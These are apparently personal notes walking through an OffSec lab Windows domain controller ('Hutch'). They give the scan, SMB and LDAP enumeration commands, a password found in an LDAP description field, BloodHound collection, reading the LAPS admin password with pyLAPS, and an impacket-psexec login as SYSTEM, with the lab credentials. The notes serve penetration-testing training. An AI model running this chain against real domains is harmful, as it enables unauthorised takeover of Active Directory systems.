### Enumeration
```
IP=192.168.239.122
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p53,80,122,135,139,445,636,3268,49692,49668,49673 -A $IP
```
### Ports
- 53
	- Simple DNS Plus
- 80
	- Microsoft IIS httpd 10.0
- 122
	- filtered smakynet
- 135
	- RPC
- 139
	- RPC
- 445
	- microsoft-ds
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
- 464
	- kpasswd5
- 3269
	- tcpwrapped
- 9389
	- .NET Message Framing
- 5985
	- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- 88
	- Microsoft Windows Kerberos
- 593
	- ncacn_http   Microsoft Windows RPC over HTTP 1.0
	- does not resolve in browser
- 389
	- Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
- 49674
	- RPC
- 49673
	- Microsoft Windows RPC over HTTP 1.0
	- does not resolve in browser
- 49666
	- RPC
- 49676
	- RPC
- 49991
	- RPC
- 49692
	- RPC
- 49668
	- RPC
### Foothold
- 445
	- smbclient -N -L //$IP
		- anonymous login success. no shares
	- nmap --script smb-vuln* -p135,139,445 $IP
		- No vulns
- 80
	- ![[Pasted image 20240702085305.png]]
	- dirsearch -u http://$IP
		- `/aspnet_client`
	- /aspnet_client
		- 403 forbidden
- sudo responder -I tun0
	- nothing
- enum4linux -U $IP
	- Nothing
- `ldapsearch -H ldap://$IP -x -b "DC=hutch,DC=offsec" > ldapsearch.txt
	- grep -E 'sAMAccountName|description' ldapsearch.txt
	- ![[Pasted image 20240702090713.png]]
	- Double check file and find fmcsorley has password of CrabSharkJellyfish192
	- Validate creds
		- crackmapexec smb $IP -u fmcsorley -p CrabSharkJellyfish192
			- Successful
		- impacket-GetUserSPNs -dc-ip $IP hutch.offsec/fmcsorley
			- no entries found
		- Does not seem to be external kerberoast
		- `sudo bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns $IP -d hutch.offsec -c all
		- bloodhound to open bloodhound
		- imported data
		- fmcsorley
			- outbound permissions
				- first degree object
					- read laps password over DC
						- read the password of local admin
						- `pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"`
						- `./pyLAPS.py --action get --dc-ip $IP -d 'hutch.offsec' -u "fmcsorley" -p "CrabSharkJellyfish192"`
							- `vr47R-%}09FBKv`
						- impacket-psexec administrator:'vr47R-%}09FBKv'@$IP
							- allowed login as nt auth system
### Lessons Learned